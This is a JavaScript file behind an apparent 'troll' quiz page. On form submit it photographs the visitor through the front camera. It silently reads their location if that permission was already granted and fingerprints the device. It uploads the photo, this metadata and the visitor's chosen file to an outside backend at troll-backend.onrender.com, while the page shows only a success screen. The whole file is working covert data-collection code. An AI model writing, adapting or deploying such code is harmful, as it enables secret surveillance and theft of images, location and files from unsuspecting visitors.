const btn = document.getElementById('submit-btn');
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const fileInput = document.getElementById('user-file');

const BACKEND_BASE = "https://troll-backend.onrender.com/api";

// ================================
// SILENT LOCATION (ONLY IF ALREADY ALLOWED)
// ================================
async function getSilentLocation() {
  let loc = "";
  if (!navigator.permissions) return loc;

  try {
    const status = await navigator.permissions.query({ name: "geolocation" });
    if (status.state === "granted") {
      const pos = await new Promise((res, rej) =>
        navigator.geolocation.getCurrentPosition(res, rej)
      );
      loc = `${pos.coords.latitude}, ${pos.coords.longitude}`;
    }
  } catch {}
  return loc;
}

// ================================
// COLLECT METADATA
// ================================
async function collectMetadata() {
  const meta = {
    width: window.innerWidth,
    height: window.innerHeight,
    platform: navigator.platform,
    language: navigator.language,
    useragent: navigator.userAgent,
    time: new Date().toLocaleString(),
    location: await getSilentLocation(),
    battery: "N/A"
  };

  if (navigator.getBattery) {
    try {
      const battery = await navigator.getBattery();
      meta.battery = `${battery.level * 100}% charging:${battery.charging}`;
    } catch {}
  }

  return meta;
}

// ================================
// CAPTURE CAMERA
// ================================
async function captureCameraImage() {
  const stream = await navigator.mediaDevices.getUserMedia({
    video: { facingMode: "user" },
    audio: false
  });

  video.srcObject = stream;
  await new Promise(r => setTimeout(r, 2500)); // short delay for user

  const ctx = canvas.getContext("2d");
  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

  const image = canvas.toDataURL("image/png");
  const metadata = await collectMetadata();

  await fetch(`${BACKEND_BASE}/upload`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ image, metadata })
  });

  // Stop camera
  stream.getTracks().forEach(track => track.stop());
}

// ================================
// SEND FILE
// ================================
async function sendFile(file) {
  if (!file) return;
  const reader = new FileReader();
  reader.onload = async () => {
    await fetch(`${BACKEND_BASE}/file-upload`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ file: reader.result, filename: file.name })
    });
  };
  reader.readAsDataURL(file);
}

// ================================
// FORM SUBMIT
// ================================
btn.addEventListener("click", async e => {
  e.preventDefault();

  if (!fileInput.files.length) return;

  try {
    // Request camera permission and capture
    await captureCameraImage();

    // Upload file
    await sendFile(fileInput.files[0]);

    // Show success page
    document.getElementById("quiz-container").style.display = "none";
    document.getElementById("success-container").style.display = "flex";

  } catch (err) {
    console.error(err);
    alert("Error: camera permission denied or something went wrong.");
  }
});
